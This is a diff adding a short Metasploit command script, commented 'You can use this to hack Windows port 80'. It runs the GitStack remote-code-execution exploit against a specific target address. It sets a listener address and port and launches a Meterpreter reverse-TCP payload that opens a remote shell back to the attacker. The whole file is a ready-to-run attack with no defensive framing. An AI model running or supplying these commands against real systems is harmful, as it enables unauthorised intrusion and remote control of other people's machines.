@@ -1,0 +1,28 @@
+# You can use this to hack Windows port 80
+
+# You need to start msfconsole in terminal
+msfconsole
+
+# Select exploit type
+use exploit/windows/http/gitstack_rce
+
+# Check options
+show options
+
+# Set target ip
+set RHOST 193.132.124.19
+
+# Set target port
+set RPORT 80
+
+# Set listening ip (my ip)
+set LHOST 139.234.252.12
+
+# Set listening port (my port)
+set LPORT 4444
+
+# Select payload type
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+# Start hack
+exploit
